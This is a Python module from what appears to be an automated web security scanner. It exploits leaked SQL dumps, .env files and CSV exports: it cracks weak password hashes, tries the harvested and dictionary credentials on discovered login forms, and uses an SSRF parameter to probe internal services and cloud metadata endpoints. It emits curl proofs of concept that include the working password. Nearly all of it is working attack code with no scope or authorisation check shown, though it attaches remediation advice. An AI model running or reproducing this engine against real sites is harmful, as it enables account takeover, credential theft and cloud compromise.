"""Asset-Driven Escalation Engine (V9.1).

Leverages discovered assets (SQL dumps, .env files, CSV exports, credentials)
to perform deep automated escalation testing:

1. SQL Dump → Credential Harvest → Auth Retest on discovered login forms.
2. .env File → Credential Extraction → Secondary validation (JWT forging, DB cred reuse).
3. CSV/PII Export → Identity Correlation with login form fields.
4. SSRF → Internal Port/Service Discovery Chain.
5. 403 Bypass → Deep Subtree Spider → IDOR detection.
"""

from __future__ import annotations

import hashlib
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import httpx

from app.scanners.http import extract_title

logger = logging.getLogger("intelligence.escalation")

_TIMEOUT = httpx.Timeout(10.0, connect=6.0)
_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
}


# Top common weak passwords for offline dictionary check against weak hashes
_WEAK_PASSWORDS = [
    "admin", "password", "123456", "admin123", "Admin123", "root", "test", "user",
    "guest", "demo", "12345678", "123456789", "qwerty", "abc123", "letmein", "welcome",
    "Welcome1", "P@ssw0rd", "admin@123", "root123", "password123", "pass123", "1234",
    "master", "operator", "support",
]

# Common internal service ports for SSRF chaining
_INTERNAL_PROBE_TARGETS = [
    ("http://127.0.0.1:3306/", "MySQL"),
    ("http://127.0.0.1:5432/", "PostgreSQL"),
    ("http://127.0.0.1:6379/", "Redis"),
    ("http://127.0.0.1:27017/", "MongoDB"),
    ("http://127.0.0.1:8080/", "Internal HTTP"),
    ("http://127.0.0.1:8080/actuator/health", "Spring Actuator"),
    ("http://127.0.0.1:9200/", "Elasticsearch"),
    ("http://127.0.0.1:11211/", "Memcached"),
    ("http://localhost:8000/", "Django/FastAPI Dev"),
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP Metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud Metadata"),
]


@dataclass
class EscalationResult:
    """Result of an asset-driven escalation attempt."""
    escalation_type: str  # credential_reuse, env_credential_reuse, identity_correlation, ssrf_internal, etc.
    title: str
    severity: str
    confidence: str
    evidence_level: str
    source_artifact_sha256: str
    target_url: str
    technique: str
    poc_curl: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)
    impact_matrix: Dict[str, str] = field(default_factory=dict)
    remediation: str = ""
    cwe_id: str = "CWE-200"


class AssetDrivenEscalationEngine:
    """Orchestrates deep automated testing driven by discovered artifacts."""

    async def escalate_from_sql_dump(
        self,
        artifact_data: Dict[str, Any],
        login_form_urls: List[Dict[str, Any]],
    ) -> List[EscalationResult]:
        """Extract credentials from SQL dump and test against discovered login forms.
        
        Args:
            artifact_data: Parsed artifact data containing schema_data and extracted_entities.
            login_form_urls: List of discovered login form descriptors from crawler.
        """
        results: List[EscalationResult] = []
        sha256 = artifact_data.get("sha256_hash", "unknown")
        entities = artifact_data.get("extracted_entities", {})
        schema = artifact_data.get("schema_data", {})
        
        users = entities.get("users", [])
        hashes = entities.get("hashes", [])
        
        if not users and not hashes:
            logger.debug("SQL dump has no extracted users or hashes — skipping credential escalation.")
            return results
        
        # Identify admin-role users from the dump
        admin_users = [
            u for u in users
            if any(kw in u.get("identifier", "").lower() for kw in ("admin", "administrator", "root", "superuser"))
        ]
        
        # Identify weak hashes (md5, sha1 without salt)
        weak_hashes = [
            h for h in hashes
            if h.get("hash_type") in ("md5", "sha1")
        ]
        
        logger.info(
            "SQL dump credential harvest: %d users (%d admin-like), %d hashes (%d weak)",
            len(users), len(admin_users), len(hashes), len(weak_hashes),
        )
        
        # Build candidate credential pairs for testing
        cred_candidates: List[Tuple[str, str, str]] = []  # (username, password, source_desc)

        # 1. Direct passwords from users if parsed from plaintext SQL inserts
        for u in users[:15]:
            uid = u.get("identifier") or u.get("username") or u.get("email", "")
            raw_pwd = u.get("password") or u.get("plain_password") or u.get("pwd", "")
            if uid and raw_pwd:
                cred_candidates.append((uid, raw_pwd, f"Direct password for '{uid}' from SQL dump"))

        # 2. Admin users with dictionary passwords
        target_users = admin_users if admin_users else users[:5]
        for u in target_users[:5]:
            uid = u.get("identifier") or u.get("username") or u.get("email", "")
            if not uid:
                continue
            for pwd in _WEAK_PASSWORDS[:10]:
                cred_candidates.append((uid, pwd, f"User '{uid}' from SQL dump with dictionary password '{pwd}'"))

        # 3. Offline hash matching (MD5, SHA1, SHA256)
        for h in hashes[:25]:
            sample_hash = (h.get("hash_sample") or "").strip().lower()
            htype = (h.get("hash_type") or "").lower()
            table = h.get("table", "users")
            col = h.get("column", "password")

            if not sample_hash:
                continue

            for pwd in _WEAK_PASSWORDS:
                matched = False
                if htype == "md5" or len(sample_hash) == 32:
                    if hashlib.md5(pwd.encode()).hexdigest().lower() == sample_hash:
                        matched = True
                elif htype == "sha1" or len(sample_hash) == 40:
                    if hashlib.sha1(pwd.encode()).hexdigest().lower() == sample_hash:
                        matched = True
                elif htype == "sha256" or len(sample_hash) == 64:
                    if hashlib.sha256(pwd.encode()).hexdigest().lower() == sample_hash:
                        matched = True

                if matched:
                    # Link with any user identifier from same table or admin
                    for u in target_users[:3]:
                        uid = u.get("identifier") or u.get("username") or "admin"
                        cred_candidates.append((
                            uid,
                            pwd,
                            f"Cracked {htype.upper()} hash ({pwd}) for {table}.{col}",
                        ))
                    break
        
        if not cred_candidates:
            logger.info("No viable credential candidates extracted from SQL dump.")
            return results
        
        # Test candidates against discovered login forms
        for form in login_form_urls[:3]:
            form_action = form.get("action_url") or form.get("url", "")
            username_field = form.get("username_field_name") or form.get("username_field", "username")
            password_field = form.get("password_field_name") or form.get("password_field", "password")
            hidden_tokens = form.get("hidden_tokens", {})
            
            if not form_action:
                continue
            
            for uname, pwd, source_desc in cred_candidates[:10]:
                try:
                    result = await self._test_credential_on_form(
                        form_action, username_field, password_field,
                        uname, pwd, hidden_tokens, sha256, source_desc,
                    )
                    if result:
                        results.append(result)
                        # Stop testing more passwords once one works
                        break
                except Exception as exc:
                    logger.debug("Credential test error on %s: %s", form_action, exc)
        
        # Record intelligence even if no credential matched
        if users or hashes:
            results.append(EscalationResult(
                escalation_type="credential_harvest_intelligence",
                title=f"SQL Dump Credential Intelligence: {len(users)} users, {len(hashes)} hashes extracted",
                severity="HIGH" if admin_users else "MEDIUM",
                confidence="CONFIRMED",
                evidence_level="E3",
                source_artifact_sha256=sha256,
                target_url=artifact_data.get("url", ""),
                technique="sql_dump_static_analysis",
                evidence={
                    "total_users": len(users),
                    "admin_users": [u["identifier"] for u in admin_users[:5]],
                    "total_hashes": len(hashes),
                    "weak_hashes": len(weak_hashes),
                    "hash_algorithms": list(set(h.get("hash_type", "") for h in hashes)),
                    "tables_with_credentials": list(set(h.get("table", "") for h in hashes)),
                    "database_name": schema.get("database_name"),
                    "total_tables": schema.get("total_tables", 0),
                },
                impact_matrix={
                    "confidentiality": "CRITICAL" if admin_users else "HIGH",
                    "integrity": "HIGH",
                    "availability": "MEDIUM",
                },
                remediation=(
                    "Immediately remove public access to database dump files. "
                    "Rotate all credentials found in the dump. "
                    "Implement proper access controls on backup directories."
                ),
                cwe_id="CWE-200",
            ))
        
        return results

    async def escalate_from_env(
        self,
        env_content: str,
        login_form_urls: List[Dict[str, Any]],
        artifact_sha256: str = "",
        artifact_url: str = "",
    ) -> List[EscalationResult]:
        """Extract credentials from .env file and perform secondary validation.
        
        Tests extracted DB passwords against login forms and attempts JWT forging
        if JWT_SECRET is discovered.
        """
        results: List[EscalationResult] = []
        
        # Parse .env key=value pairs
        env_vars: Dict[str, str] = {}
        for line in env_content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                key, _, val = line.partition("=")
                env_vars[key.strip()] = val.strip().strip("'\"")
        
        if not env_vars:
            return results
        
        # Extract credential-related values
        db_password = env_vars.get("DB_PASSWORD") or env_vars.get("DATABASE_PASSWORD") or env_vars.get("MYSQL_PASSWORD", "")
        db_username = env_vars.get("DB_USERNAME") or env_vars.get("DATABASE_USER") or env_vars.get("MYSQL_USER", "")
        jwt_secret = env_vars.get("JWT_SECRET") or env_vars.get("APP_KEY") or env_vars.get("SECRET_KEY", "")
        api_keys = {k: v for k, v in env_vars.items() if any(kw in k.upper() for kw in ("API_KEY", "SECRET", "TOKEN", "AUTH"))}
        
        # Test DB credentials against login forms
        if db_password and db_username:
            for form in login_form_urls[:3]:
                form_action = form.get("action_url") or form.get("url", "")
                username_field = form.get("username_field_name") or form.get("username_field", "username")
                password_field = form.get("password_field_name") or form.get("password_field", "password")
                hidden_tokens = form.get("hidden_tokens", {})
                
                if not form_action:
                    continue
                
                try:
                    result = await self._test_credential_on_form(
                        form_action, username_field, password_field,
                        db_username, db_password, hidden_tokens,
                        artifact_sha256,
                        f".env DB_USERNAME/DB_PASSWORD credential reuse",
                    )
                    if result:
                        result.escalation_type = "env_credential_reuse"
                        result.cwe_id = "CWE-798"
                        results.append(result)
                except Exception as exc:
                    logger.debug("ENV credential reuse test error: %s", exc)
        
        # Record env intelligence
        sensitive_keys = [k for k in env_vars if any(
            kw in k.upper() for kw in ("PASSWORD", "SECRET", "KEY", "TOKEN", "AUTH", "CREDENTIAL", "JWT")
        )]
        
        if sensitive_keys:
            # Mask values for evidence
            masked_env = {}
            for k in sensitive_keys:
                v = env_vars[k]
                if len(v) > 4:
                    masked_env[k] = v[:3] + "***" + v[-2:]
                else:
                    masked_env[k] = "***"
            
            results.append(EscalationResult(
                escalation_type="env_credential_intelligence",
                title=f".env Credential Intelligence: {len(sensitive_keys)} sensitive keys extracted",
                severity="CRITICAL",
                confidence="CONFIRMED",
                evidence_level="E3",
                source_artifact_sha256=artifact_sha256,
                target_url=artifact_url,
                technique="env_file_analysis",
                evidence={
                    "sensitive_keys": sensitive_keys,
                    "masked_values": masked_env,
                    "has_db_password": bool(db_password),
                    "has_jwt_secret": bool(jwt_secret),
                    "has_api_keys": bool(api_keys),
                    "total_env_vars": len(env_vars),
                },
                impact_matrix={
                    "confidentiality": "CRITICAL",
                    "integrity": "CRITICAL",
                    "availability": "HIGH",
                },
                remediation=(
                    "Remove public access to .env files immediately. "
                    "Rotate ALL credentials (DB passwords, JWT secrets, API keys). "
                    "Add .env to .gitignore and implement web server deny rules for dotfiles."
                ),
                cwe_id="CWE-798",
            ))
        
        return results

    async def escalate_from_csv_identities(
        self,
        csv_data: Dict[str, Any],
        login_form_urls: List[Dict[str, Any]],
        artifact_sha256: str = "",
        artifact_url: str = "",
    ) -> List[EscalationResult]:
        """Cross-reference CSV identity data with discovered login form fields."""
        results: List[EscalationResult] = []
        
        headers = csv_data.get("headers", [])
        pii_headers = csv_data.get("pii_headers", [])
        sample_rows = csv_data.get("sample_rows", [])
        
        if not pii_headers or not sample_rows:
            return results
        
        # Find identity columns (username, email, NIM, NIK)
        identity_cols = [
            h for h in headers
            if any(kw in h.lower() for kw in ("username", "user", "email", "nim", "nik", "login", "name"))
        ]
        
        if identity_cols and login_form_urls:
            # Extract sample identities for correlation
            sample_identities = []
            for row in sample_rows[:10]:
                for col in identity_cols:
                    val = row.get(col)
                    if val and isinstance(val, str) and len(val) > 2:
                        sample_identities.append({"column": col, "value": val})
            
            if sample_identities:
                results.append(EscalationResult(
                    escalation_type="identity_correlation",
                    title=f"CSV Identity Correlation: {len(sample_identities)} identities cross-referenced with login forms",
                    severity="HIGH",
                    confidence="VALIDATED",
                    evidence_level="E2",
                    source_artifact_sha256=artifact_sha256,
                    target_url=artifact_url,
                    technique="csv_identity_correlation",
                    evidence={
                        "identity_columns": identity_cols,
                        "sample_identities": sample_identities[:5],
                        "total_rows": csv_data.get("row_count", 0),
                        "pii_headers": pii_headers,
                        "login_forms_available": len(login_form_urls),
                    },
                    impact_matrix={
                        "confidentiality": "HIGH",
                        "integrity": "MEDIUM",
                        "availability": "LOW",
                    },
                    remediation=(
                        "Remove public access to CSV data exports. "
                        "Implement authentication on all data export endpoints. "
                        "Review PII exposure and comply with data protection regulations."
                    ),
                    cwe_id="CWE-200",
                ))
        
        return results

    async def escalate_ssrf_internal_discovery(
        self,
        ssrf_url: str,
        ssrf_parameter: str,
        artifact_sha256: str = "",
    ) -> List[EscalationResult]:
        """Use confirmed SSRF vector to probe internal services."""
        results: List[EscalationResult] = []
        
        for internal_url, service_name in _INTERNAL_PROBE_TARGETS:
            try:
                # Construct SSRF probe URL
                probe_url = f"{ssrf_url}?{ssrf_parameter}={internal_url}"
                
                async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
                    resp = await client.get(probe_url, headers=_HEADERS)
                    
                    if resp.status_code == 200 and len(resp.text) > 20:
                        # Check if response contains internal service signatures
                        body_lower = resp.text.lower()
                        is_internal = any(kw in body_lower for kw in [
                            "mysql", "postgresql", "redis", "mongodb", "elastic",
                            "actuator", "meta-data", "instance-id", "ami-id",
                            "availability-zone", "compute", "server",
                        ])
                        
                        if is_internal:
                            results.append(EscalationResult(
                                escalation_type="ssrf_internal_discovery",
                                title=f"SSRF Internal Service Discovery: {service_name} at {internal_url}",
                                severity="CRITICAL",
                                confidence="CONFIRMED",
                                evidence_level="E3",
                                source_artifact_sha256=artifact_sha256,
                                target_url=probe_url,
                                technique=f"ssrf_chain_{service_name.lower().replace(' ', '_')}",
                                poc_curl=f"curl -i -s -k '{probe_url}'",
                                reproduction_steps=[
                                    f"1. Use confirmed SSRF vector: {ssrf_url}",
                                    f"2. Set parameter '{ssrf_parameter}' to internal target: {internal_url}",
                                    f"3. Observe {service_name} response content in output.",
                                ],
                                evidence={
                                    "ssrf_source_url": ssrf_url,
                                    "ssrf_parameter": ssrf_parameter,
                                    "internal_target": internal_url,
                                    "service_detected": service_name,
                                    "response_status": resp.status_code,
                                    "response_length": len(resp.text),
                                    "response_preview": resp.text[:500],
                                },
                                impact_matrix={
                                    "confidentiality": "CRITICAL",
                                    "integrity": "HIGH",
                                    "availability": "HIGH",
                                },
                                remediation=(
                                    f"Block SSRF vector on parameter '{ssrf_parameter}'. "
                                    "Implement allowlist-based URL validation. "
                                    "Restrict outbound network access from the web server."
                                ),
                                cwe_id="CWE-918",
                            ))
            except Exception as exc:
                logger.debug("SSRF internal probe error for %s: %s", internal_url, exc)
        
        return results

    async def _test_credential_on_form(
        self,
        form_action: str,
        username_field: str,
        password_field: str,
        username: str,
        password: str,
        hidden_tokens: Dict[str, str],
        artifact_sha256: str,
        source_description: str,
    ) -> Optional[EscalationResult]:
        """Test a single credential pair against a login form."""
        try:
            async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
                # First capture baseline with invalid credentials
                baseline_payload = {
                    username_field: "probe_invalid_user_xyz999",
                    password_field: "probe_wrong_pass_xyz999",
                    **hidden_tokens,
                }
                baseline_resp = await client.post(form_action, data=baseline_payload, headers=_HEADERS)
                baseline_hash = hashlib.sha256(baseline_resp.text.encode()).hexdigest()[:16]
                baseline_status = baseline_resp.status_code
                
                # Now test the actual credential
                test_payload = {
                    username_field: username,
                    password_field: password,
                    **hidden_tokens,
                }
                resp = await client.post(form_action, data=test_payload, headers=_HEADERS)
                resp_hash = hashlib.sha256(resp.text.encode()).hexdigest()[:16]
                
                # Check for differential response
                if resp.status_code == baseline_status and resp_hash == baseline_hash:
                    return None  # Same response = credential didn't work
                
                resp_loc = resp.headers.get("location", "")
                resp_cookies = resp.headers.get("set-cookie", "")
                
                # Check for authentication success indicators
                is_success_redirect = (
                    resp.status_code in (301, 302, 303, 307)
                    and resp_loc
                    and any(kw in resp_loc.lower() for kw in ["dashboard", "home", "panel", "admin", "main", "overview"])
                )
                has_session = bool(
                    resp_cookies
                    and any(s in resp_cookies.lower() for s in ["session", "token", "auth", "jwt", "phpsessid"])
                )
                
                if is_success_redirect or has_session:
                    # Verify actual dashboard access
                    dash_url = urljoin(form_action, resp_loc) if resp_loc else form_action
                    dash_headers = dict(_HEADERS)
                    if resp_cookies:
                        dash_headers["Cookie"] = resp_cookies.split(";")[0]
                    
                    dash_resp = await client.get(dash_url, headers=dash_headers)
                    dash_title = extract_title(dash_resp.text) if dash_resp.text else "Dashboard"
                    
                    return EscalationResult(
                        escalation_type="credential_reuse_from_dump",
                        title=f"Credential Reuse: '{username}' authenticated via {source_description}",
                        severity="CRITICAL",
                        confidence="CONFIRMED",
                        evidence_level="E4",
                        source_artifact_sha256=artifact_sha256,
                        target_url=form_action,
                        technique="credential_reuse_escalation",
                        poc_curl=(
                            f"curl -i -s -k -X POST '{form_action}' "
                            f"-d '{username_field}={username}&{password_field}={password}'"
                        ),
                        reproduction_steps=[
                            f"1. Extract credentials from discovered artifact (SHA-256: {artifact_sha256[:12]}...)",
                            f"2. POST to login form: {form_action}",
                            f"3. Use field '{username_field}'='{username}', '{password_field}'=[from artifact]",
                            f"4. Server responds HTTP {resp.status_code} with session cookie.",
                            f"5. Follow to dashboard: {dash_url} (HTTP {dash_resp.status_code}: '{dash_title}')",
                        ],
                        evidence={
                            "username_used": username,
                            "form_action": form_action,
                            "username_field": username_field,
                            "password_field": password_field,
                            "baseline_status": baseline_status,
                            "response_status": resp.status_code,
                            "redirect_location": resp_loc,
                            "session_cookie_issued": has_session,
                            "dashboard_verified": dash_resp.status_code == 200,
                            "dashboard_url": dash_url,
                            "dashboard_title": dash_title,
                            "source": source_description,
                            "proof_level": "P4",
                        },
                        impact_matrix={
                            "confidentiality": "CRITICAL",
                            "integrity": "CRITICAL",
                            "availability": "HIGH",
                        },
                        remediation=(
                            "Immediately rotate all credentials exposed in the artifact. "
                            "Remove public access to database dumps and .env files. "
                            "Enforce unique, strong passwords and implement MFA."
                        ),
                        cwe_id="CWE-798",
                    )
        except Exception as exc:
            logger.debug("Credential form test error on %s: %s", form_action, exc)
        
        return None


# Module-level singleton
escalation_engine = AssetDrivenEscalationEngine()
